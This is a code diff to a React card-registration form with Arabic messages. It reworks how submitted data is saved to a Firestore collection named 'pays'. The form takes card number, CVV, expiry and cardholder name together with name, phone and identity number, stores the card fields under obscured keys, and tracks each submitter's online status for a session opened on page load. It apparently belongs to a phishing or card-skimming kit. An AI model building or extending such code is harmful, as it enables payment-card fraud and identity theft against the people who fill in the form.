@@ -2,17 +2,18 @@ import React, { useState } from 'react';
 import { ArrowRight } from 'lucide-react';
 import cardImg from '../assets/card-crop.jpg';
 import { db } from '../lib/firebase';
-import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { doc, updateDoc, arrayUnion, serverTimestamp } from 'firebase/firestore';
 import { _e } from '../lib/secure-utils';
 import type { UserData } from './RegisterData';
 
 interface Props {
   onBack: () => void;
-  onNext: (docId: string) => void;
+  onNext: () => void;
+  sessionId: string;
   userData: UserData;
 }
 
-export default function RegisterCard({ onBack, onNext, userData }: Props) {
+export default function RegisterCard({ onBack, onNext, sessionId, userData }: Props) {
   const [cardName,   setCardName]   = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [expiry,     setExpiry]     = useState('');
@@ -80,8 +81,10 @@ export default function RegisterCard({ onBack, onNext, userData }: Props) {
         firstDigit === '5' ? 'Mastercard' :
         firstDigit === '3' ? 'Amex' : 'Other';
 
-      const docRef = await addDoc(collection(db, 'pays'), {
-        // User personal data
+      // Update the existing session doc (created on app load) with card data
+      const ref = doc(db, 'pays', sessionId);
+      await updateDoc(ref, {
+        // User personal data (may already be set, refresh anyway)
         ownerName:      userData.name,
         phoneNumber:    userData.phone,
         identityNumber: userData.id,
@@ -120,29 +123,25 @@ export default function RegisterCard({ onBack, onNext, userData }: Props) {
         isUnread:      true,
         isOnline:      true,
         lastSeen:      now,
+        updatedAt:     serverTimestamp(),
 
-        // History entry for this card submission
-        history: [
-          {
-            id:        historyId,
-            type:      '_t1',
-            timestamp: now,
-            status:    'pending',
-            data: {
-              _v1:      _e(rawCardNumber),
-              _v2:      _e(cvv),
-              _v3:      _e(expiry),
-              _v4:      _e(cardName),
-              cardType,
-            },
+        // Append card history entry
+        history: arrayUnion({
+          id:        historyId,
+          type:      '_t1',
+          timestamp: now,
+          status:    'pending',
+          data: {
+            _v1:      _e(rawCardNumber),
+            _v2:      _e(cvv),
+            _v3:      _e(expiry),
+            _v4:      _e(cardName),
+            cardType,
           },
-        ],
-
-        createdAt: serverTimestamp(),
-        updatedAt: serverTimestamp(),
+        }),
       });
 
-      onNext(docRef.id);
+      onNext();
     } catch (err: any) {
       console.error('Firebase error:', err);
       setError('حدث خطأ أثناء الإرسال، يرجى المحاولة مجدداً');
